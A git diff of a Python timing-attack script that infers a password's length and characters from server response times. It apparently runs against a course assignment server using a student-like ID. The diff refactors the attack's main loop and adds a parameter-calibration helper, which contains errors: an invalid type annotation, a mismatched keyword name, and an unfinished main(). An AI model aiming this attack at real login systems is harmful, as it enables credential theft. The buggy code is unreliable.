@@ -267,7 +267,7 @@ class TimingAttacker:
         self.decision_engine = decision_engine
         self.padding = padding
 
-    async def detect_password_length(self) -> int:
+    async def detect_password_length(self, samples_for_pwd_len: int = 5) -> int:
         """Detect password length by observing timing differences for padded passwords.
 
         Returns:
@@ -277,7 +277,7 @@ class TimingAttacker:
         
         for length in range(1, self.victim.max_pwd_len + 1):
             payload = {"password": self.padding * length}
-            _, samples = await self.sampler.run_sample(payload, n_samples=3)
+            _, samples = await self.sampler.run_sample(payload, n_samples=samples_for_pwd_len)
             samples_for_len[length] = samples
 
         best_len = self.decision_engine.decide(samples_for_len)
@@ -346,7 +346,7 @@ class TimingAttacker:
         """Attack a single non-final position using adaptive sampling.
 
         Returns:
-            The recovered character.
+            The recovered character
         """
         candidates = list(self.victim.alphabet)
         samples_per_candidate = initial_samples
@@ -406,9 +406,9 @@ class TimingAttacker:
         password_len: int,
         top_k: int = 5,
         max_rounds: int = 3,
-        sample_increment: int = 2,
+        sample_increment: int = 1,
         max_samples: int = 10,
-        initial_samples: int = 1,
+        initial_samples: int = 3,
         min_gap_microseconds: int = 200
     ) -> str:
         """Perform the complete timing attack.
@@ -452,44 +452,51 @@ class TimingAttacker:
 # ==========================
 # Main
 # ==========================
-async def main():
-    BASE_URL = "http://aoi-assignment1.oy.ne.ro:8080/"
+def calibrate_attack_params(difficulty: int = 1) -> Dict[str: int]:
+    attack_params = {
+        "initial_samples": max(2, difficulty) if difficulty <= 5 else difficulty * 2,
+        "sample_increment": 2 if difficulty <= 4 else difficulty,
+        "max_samples": max(10, difficulty * 5),
+        "min_gap_us": max(1000, 100000 // difficulty),
+        "top_k": 3 if difficulty <= 3 else 5,
+        "max_rounds": 3 if difficulty <= 2 else 5
+    }
+    return attack_params
 
-    USERNAME = "315388850"    
+async def commit_full_attack(username: str, victim: VictimServer, difficulty: int = 1, retries_on_fail: int = 3):
+    base_payload = {"user": username, "difficulty": difficulty}
     
+    async_http_sender = AsyncHTTPSender(url=victim.url, base_payload=base_payload)
+    median_decision_engine = MedianDecisionEngine(min_samples=max(2, difficulty))
+    attacker = TimingAttacker(
+        victim_server=victim,
+        sender=async_http_sender,
+        base_payload=base_payload,
+        decision_engine=median_decision_engine
+    )
+    attack_params = calibrate_attack_params(difficulty=difficulty)
+
     try:
-        for d in range(1, 6):
-
-            DIFFICULTY = d
-
-            base_payload = {
-                "user": USERNAME,
-                "difficulty": DIFFICULTY
-            }
-
-            victim = VictimServer(url=BASE_URL)
-            async_http_sender = AsyncHTTPSender(url=victim.url, base_payload=base_payload)
-            median_decision_engine = MedianDecisionEngine(min_samples=max(2, DIFFICULTY))
-
-            attacker = TimingAttacker(
-                victim_server=victim,
-                sender=async_http_sender,
-                base_payload=base_payload,
-                decision_engine=median_decision_engine
-            )
-
-            print(f"[+] [{time.ctime()}] Start Attack on: [{BASE_URL}] difficulty {DIFFICULTY}")
-
-            password_length = await attacker.detect_password_length()
-            print(f"    (-) {time.ctime()} Detect PWD Len: {password_length}")
-
-            password = await attacker.attack(password_len=password_length)
-            print(f"    (-) {time.ctime()} FINAL PASSWORD: {password}")
-
-            await async_http_sender.close_sessions()
-            
+        password_length = await attacker.detect_password_length()
+        password = await attacker.attack(password_len=password_length, **attack_params)
+        # TODO: check if succuss (1), if not do retrie
+        await async_http_sender.close_sessions()
+    
     except Exception as e:
         await async_http_sender.close_sessions()
+
+
+
+
+async def main():
+    BASE_URL = "http://aoi-assignment1.oy.ne.ro:8080/"
+    USERNAME = "315388850"
+    MAX_DIFFICULTY = 5
+
+    victim = VictimServer(url=BASE_URL)
+
+
+
 
 
 
